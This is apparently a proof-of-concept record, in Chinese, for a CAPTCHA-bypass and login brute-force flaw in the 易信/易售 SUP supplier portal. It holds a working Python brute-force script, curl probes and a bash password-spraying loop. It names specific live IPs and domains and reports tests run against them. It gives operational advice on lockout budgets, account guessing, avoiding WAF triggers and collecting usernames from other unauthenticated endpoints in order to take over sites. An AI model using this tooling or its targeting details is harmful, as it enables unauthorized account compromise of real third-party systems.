# 易信/易售 SUP 供货端 /api/supplier/Login/Verify 服务端不校验行为验证码（captcha 置空/伪造/省略照常判口令，部分 1.0.44 实例还无失败锁定）

- **code**: 易售sup-供货端-api-supplier-login-verify-服务端不校验行为验证码-captcha-cap
- **kind**: poc
- **category**: auth-bypass
- **component**: 易信SUP / 易售SUP 供货商端 supplier 门户（Go 后端，1.0.44，/api/supplier/Login/*）
- **versions**: 1.0.44（同族 1.0.43 端口径）
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: task#616，2026-11-06 两次独立实测同一接口：① finding 1295，本机 Windows curl.exe --noproxy "*" 直连 154.12.94.23:8080 / 154.12.94.216:8080 / 43.129.214.240:80（Host 各为其绑定域名且带尾点），captcha 空串、真实 captcha_key + 伪造 captcha "zz"、以及完全省略 captcha/captcha_key 三种形态均返回 HTTP 200 / 56B {"code":1,"data":null,"message":"账号或密码错误"}，无一次返回验证码相关文案；三台 admin 各连错 7 次，全程无 429、无「锁定/禁止登录/解禁」文案、无 Set-Cookie；不存在的账号 zzq_nonexist_9x 与 admin 响应逐字节一致（无枚举 oracle）。② finding 1294，同接口在 154.12.24.246 复现验证码闸缺失，但该实例 5 次失败后锁定并回「账号或密码错误(若连续错误5次将被禁止登录…)」。故验证码不校验为稳定缺陷，失败锁定策略随实例而异。
- **path**: pocs/易售sup-供货端-api-supplier-login-verify-服务端不校验行为验证码-captcha-cap/poc.py
- **tags**: 易信sup, 易售sup, yixinsup, yishou, supplier, 供货端, auth-bypass, captcha, 验证码绕过, 登录爆破, 无失败锁定, 账号枚举, go, api
- **created_at**: 2026-11-06T07:36:52.445Z
- **engine**: 154.12.94.23:8080（Host: sup.yixinsup.top.）/ 154.12.94.216:8080（Host: shop.lmbb77.top.）/ 43.129.214.240:80（Host: niangao.site.）；同族实例 154.12.24.246（Host: supplier.yhj.lol）
- **found_by**: vuln-scan

## 描述

易信/易售 SUP 供货商端把行为验证码只作为前端状态（captchaVerified）控制，服务端既不校验 captcha 值、也不把 captcha/captcha_key 作为必填项：置空、真实 key 配伪造值、整段省略，三种形态都直接进入账号口令比对并统一返回「账号或密码错误」。因此该登录面只剩口令强度一道防线；而部分 1.0.44 实例连失败计数/锁定都没有（本次三台 admin 各连错 7 次无 429 无锁定），且不存在账号与 admin 响应一致（无枚举 oracle），可任意速率无限口令爆破。同族实例锁定策略不一致，先探锁定再定预算。

## 用法

```
前置（缺一易假阴性）：
1) 端口可达：供货端默认绑 8080（部分实例 80/443）；
2) Host 必须是该实例绑定的 vhost，且**带尾点**（如 sup.yixinsup.top. / shop.lmbb77.top. / niangao.site.）；不带尾点或乱填会被 nginx/RST 掉，落到默认站或 404；
3) 无需任何凭据、无需先取验证码；HTTPS 自签时 -k / verify=False；本机代理会污染直连，用 curl --noproxy "*" 或 urllib 里 proxy_handler({})。

Step 1 打指纹（确认真是这套系统）：
   curl -sS --noproxy '*' -H 'Host: <vhost>.' http://TARGET:8080/api/supplier/Login/InitConfig
   期望 {"code":0,"data":{"name":"易信Sup","version":"1.0.44",...},"message":"ok"}
   curl -sS --noproxy '*' -H 'Host: <vhost>.' http://TARGET:8080/api/supplier/Login/Captcha
   期望 {"code":0,"data":{"captcha_key":"<32hex>","count":3,"expire":900,"image_base64":"data:image/png;base64,...","thumb_base64":"..."}}

Step 2 判定验证码闸是否在服务端（三发，必须全部发给同一账号前先确认无锁定，见 Step 3）：
   a) {"account":"admin","password":"xq9Zz_probe","captcha":"","captcha_key":""}
   b) {"account":"admin","password":"xq9Zz_probe7","captcha":"zz","captcha_key":"<上一步真实 captcha_key>"}
   c) {"account":"admin","password":"xq9Zz_nocap"}（完全不带两个字段）
   curl -sS --noproxy '*' -H 'Host: <vhost>.' -H 'Content-Type: application/json' \
     --data-binary '{"account":"admin","password":"x","captcha":"","captcha_key":""}' \
     http://TARGET:8080/api/supplier/Login/Verify

判据：
- 三发都 200 且 message 为「账号或密码错误」/「账号或密码错误(若连续错误5次将被禁止登录…)」→ 已进入口令比对，验证码闸在前端，绕过成立；
- 出现「请先完成安全验证」「验证码错误」「验证码已过期」或 4xx 缺参 → 该实例启用了服务端校验（或已修复），别再硬打；
- 成功登录时 code 变 0 并返回 data（token/用户信息），以 message 与 code 双条件判定，不要只看 HTTP 200。

Step 3 失败锁定探测（决定爆破预算，务必先做）：
   同一账号连发 6~8 个明显错误口令，观察是否出现 429、锁定文案、「N 分钟后重试」或 Set-Cookie 变化。
   - 有锁定：单账号预算 ≤4 发（同族实例 154.12.24.246 即为每账号 5 次锁定，锁后响应与口令错不可区分，容易误判成一直错）；换 IP 不解锁，锁定计数在账号维度。
   - 无锁定（本次三台 1.0.44）：无 429 无锁定文案，可放心跑字典；但仍建议 --delay 0.8~1.5 避免触发其它 WAF 层。

Step 4 账号名口径：
   供货端短名优先 admin / yishou / yixinsup / supplier / sup / operator，配合站点域派生口令与年份后缀。不存在的账号与 admin 响应完全一致（本次实测），因此无法先做账号枚举，只能盲打；若某实例出现「账号不存在」类差异化文案，则可先枚举再定点爆破。

复用脚本：
   python yishou_sup_supplier_login_captcha_bypass.py --ip TARGET --port 8080 --scheme http --host <vhost>. --probe
   python yishou_sup_supplier_login_captcha_bypass.py --ip TARGET --port 8080 --scheme http --host <vhost>. \
     --accounts admin,yishou,supplier --dict pw.txt --delay 1.2
   注意脚本内 budget = pwds[:4] 是按「5 次锁定」写的；确认 Step 3 为无锁定实例后改成 pwds（全量跑）。

常见失败原因：
   Host 少了尾点 → 连接被 RST 或返回默认站；端口写错（8080 vs 80）；用了系统代理导致 Host/SNI 错乱；只发一次 captcha 空串就下结论（必须三形态 + 锁定探测一起看）；把「账号或密码错误」当成账号不存在。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
易售SUP 供货商端 /api/supplier/Login/Verify —— 服务端不校验行为验证码
适用：易售/易信 SUP 家族 supplier 门户（Go 后端），前端 chunk 里 handleLogin 只判 captchaVerified

判定要点
  1) captcha / captcha_key 置空串 → 仍进入口令判定
  2) 整个 captcha 字段省略     → 仍进入口令判定
  3) 传真实 captcha_key 无票根 → 仍进入口令判定
  三者响应一致（默认文案「账号或密码错误(若连续错误5次将被禁止登录，需联系管理员于中控端解禁)」）
  = 行为验证码仅在前端生效，登录口可无验证码爆破。

用法
  python yishou_sup_supplier_login_captcha_bypass.py --ip 154.12.24.246 --host supplier.yhj.lol --probe
  python yishou_sup_supplier_login_captcha_bypass.py --ip 154.12.24.246 --host supplier.yhj.lol \
      --accounts admin,supplier --dict pw.txt --delay 1.2

注意
  - 必须带 Host 头（SNI 闸按 Host 分流），纯 IP 直连
  - 自签证书 → verify=False；本机代理 → trust_env=False / 环境无 http_proxy
  - 服务端每账号 5 次锁定，锁后响应与口令错不可区分，单账号最多 4 发
  - 但部分 1.0.44 实例（154.12.94.23:8080 / 154.12.94.216:8080 / 43.129.214.240:80）实测完全
    无失败锁定，此时把下面的 budget 改成全量字典即可
"""
import argparse
import json
import ssl
import sys
import time
import urllib.request


def build_body(account, password, mode):
    if mode == "empty":
        return {"account": account, "password": password, "captcha": "", "captcha_key": ""}
    if mode == "omit":
        return {"account": account, "password": password}
    if mode == "fakekey":
        # 真实格式的雪花 ID，但没有对应票根
        return {"account": account, "password": password,
                "captcha": "", "captcha_key": "1793949536802004226"}
    raise ValueError(mode)


def post(url, host, body, timeout=10):
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Host", host)
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(
        urllib.request.ProxyHandler({}),          # 禁用环境代理
        urllib.request.HTTPSHandler(context=ctx),
    )
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", required=True, help="目标 IP，如 154.12.24.246")
    ap.add_argument("--host", required=True, help="绑定的 vhost，如 supplier.yhj.lol")
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--scheme", default="https")
    ap.add_argument("--path", default="/api/supplier/Login/Verify")
    ap.add_argument("--probe", action="store_true", help="只做三种验证码形态的绕过判定")
    ap.add_argument("--accounts", default="admin", help="逗号分隔账号")
    ap.add_argument("--dict", help="口令字典文件，一行一个")
    ap.add_argument("--delay", type=float, default=1.2, help="请求间隔秒")
    ap.add_argument("--max-per-account", type=int, default=4,
                    help="单账号最多发几条（有锁定实例用 4；无锁定实例给 0 = 全量）")
    ap.add_argument("--banner", default="账号或密码错误", help="口令错时的响应特征子串")
    a = ap.parse_args()

    url = f"{a.scheme}://{a.ip}:{a.port}{a.path}"

    if a.probe:
        for mode in ("empty", "omit", "fakekey"):
            st, txt = post(url, a.host, build_body("admin", "x", mode))
            print(f"[{mode:8}] HTTP {st} {txt[:200]}")
            time.sleep(a.delay)
        print("\n判据：三条都出现口令错误文案 => 验证码未被服务端校验，绕过成立")
        print("     出现验证码相关文案（请先完成安全验证 / 验证码错误）=> 未绕过")
        return

    if not a.dict:
        sys.exit("需要 --dict 或 --probe")

    pwds = [l.strip() for l in open(a.dict, encoding="utf-8", errors="replace") if l.strip()]
    for acc in [x.strip() for x in a.accounts.split(",") if x.strip()]:
        budget = pwds if a.max_per_account == 0 else pwds[:a.max_per_account]
        for pwd in budget:
            st, txt = post(url, a.host, build_body(acc, pwd, "omit"))
            hit = a.banner not in txt and '"code":0' in txt.replace(" ", "")
            print(f"[{'HIT ' if hit else 'miss'}] {acc}:{pwd} HTTP {st} {txt[:160]}")
            if hit:
                print("=> 登录成功，拿 data 里的 token 继续")
                return
            time.sleep(a.delay)
        print(f"[info] {acc} 预算已用尽（有锁定实例请保持 ≤4）")


if __name__ == "__main__":
    main()

# ============================================================================
# 附：实测口径与实例差异（2026-11-06，task#616）
# ============================================================================
#
# 指纹（供货端，无需凭据）：
#   GET /api/supplier/Login/InitConfig
#     -> 200 {"code":0,"data":{"icon":"","name":"易信Sup","title":"易信Sup","version":"1.0.44"},"message":"ok"}
#   GET /api/supplier/Login/Captcha
#     -> 200 {"code":0,"data":{"captcha_key":"<32hex>","count":3,"expire":900,
#                              "image_base64":"data:image/png;base64,...","thumb_base64":"..."},"message":"ok"}
#
# 判定（POST /api/supplier/Login/Verify，Content-Type: application/json）：
#   形态 A {"account":"admin","password":"xq9Zz_probe","captcha":"","captcha_key":""}
#   形态 B {"account":"admin","password":"xq9Zz_probe7","captcha":"zz","captcha_key":"<真实 captcha_key>"}
#   形态 C {"account":"admin","password":"xq9Zz_nocap"}        # 两个字段都不带
#   三台实测全部：200 / 56B {"code":1,"data":null,"message":"账号或密码错误"}
#   —— 无 Set-Cookie、无验证码挑战、无 4xx，说明请求直接落到口令比对分支。
#
# 锁定策略按实例不同，必须单独探：
#   * 154.12.94.23:8080 / 154.12.94.216:8080 / 43.129.214.240:80（1.0.44）：
#       admin 每台连续 7 次错误口令 → 无 429、无「锁定/禁止登录/解禁/分钟」文案、无 Cookie；
#       不存在的账号 zzq_nonexist_9x 响应与 admin 逐字节一致 → 无账号枚举 oracle；
#       ⇒ 验证码闸与失败计数两道防线同时缺失，可任意速率无限爆破。
#   * 154.12.24.246:443（同族）：验证码同样不校验，但 5 次失败后锁定，
#       文案「账号或密码错误(若连续错误5次将被禁止登录，需联系管理员于中控端解禁)」，
#       锁后响应与口令错不可区分 → 单账号预算 ≤4 发，用 --max-per-account 4。
#
# 无锁定实例直接跑（bash 版，便于批量）：
#   for p in $(cat pw.txt); do
#     curl -sS --noproxy '*' -m 8 -H 'Host: <vhost>.' -H 'Content-Type: application/json' \
#       --data-binary "{\"account\":\"admin\",\"password\":\"$p\"}" \
#       http://TARGET:8080/api/supplier/Login/Verify; echo;
#   done
#
# 阴性/失败常见原因：
#   - Host 不带尾点 → 被 RST 或落到默认站；
#   - 端口错（供货端 8080 / 有的实例只开 80，443 未必有）；
#   - 走了本机代理 → Host/SNI 被改写，改 --noproxy '*'；
#   - 只发一次就下结论（要三形态齐发 + 锁定探测）；
#   - 把「账号或密码错误」误判成「账号不存在」，从而放弃爆破。
#
# 本次口令尝试未命中（admin/yishou/supplier × 站点域派生口令与年份后缀全部 code:1），
# 说明缺陷成立但真正拿站仍需有效账号名/口令：优先从客户站未授权接口（/api/customer/Home/*）
# 泄露的供应商名、站点域名、联系人缩写派生账号名，再打该登录面。

```
